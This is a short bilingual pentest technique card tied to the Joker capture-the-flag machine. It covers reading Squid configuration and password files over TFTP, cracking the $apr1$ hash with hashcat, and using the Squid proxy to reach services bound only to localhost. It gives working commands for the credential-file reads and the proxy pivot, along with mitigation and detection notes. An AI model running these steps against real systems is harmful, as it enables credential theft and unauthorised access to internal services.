---
topic: Squid and TFTP — exposed configuration and localhost pivot
tags: [linux, squid, tftp, proxy, pivot, credentials]
---

# Squid and TFTP — exposed configuration and localhost pivot

**English** | [🌐 Español](squid-tftp-proxy-pivot.md)

## Concept

TFTP has no directory listing, but reads known paths such as `/etc/squid/squid.conf` and `/etc/squid/passwords`. With those credentials, use Squid to reach services listening only on localhost.

## When it applies

- TFTP on UDP 69 and Squid on 3128.
- Squid requires basic authentication.
- Internal services bind to `127.0.0.1`.

## Procedure

1. Download `squid.conf` and `passwords`.
2. Crack the `$apr1$` hash with hashcat mode 1600.
3. Configure the proxy and scan `127.0.0.1`.
4. Access the internal service.

## Commands

```bash
tftp <IP>
tftp> get /etc/squid/squid.conf
tftp> get /etc/squid/passwords
hashcat -m 1600 squid.hash rockyou.txt
curl -x http://<USER>:<PASS>@<IP>:3128 http://127.0.0.1:8080/
```

## Variants

- Proxy to fuzz internal ports.
- `gobuster -p` through the proxy.
- Credentials reused on other services.

## Limitations

- TFTP may be filtered or read-only.
- Squid may restrict destinations.
- The hash may be strong.

## Mitigation

- Disable TFTP and keep hashes out of readable paths.
- Limit Squid to required destinations.
- Use unique credentials and MFA.

## Detection

- TFTP reads of configuration.
- `127.0.0.1` scans through the proxy.
- Proxy authentication from new hosts.

## References

- [0xdf — Joker](https://0xdf.gitlab.io/2020/08/13/htb-joker.html)
- [Squid — configuration](https://www.squid-cache.org/Doc/config/)
- [TFTP — RFC 1350](https://www.rfc-editor.org/rfc/rfc1350)
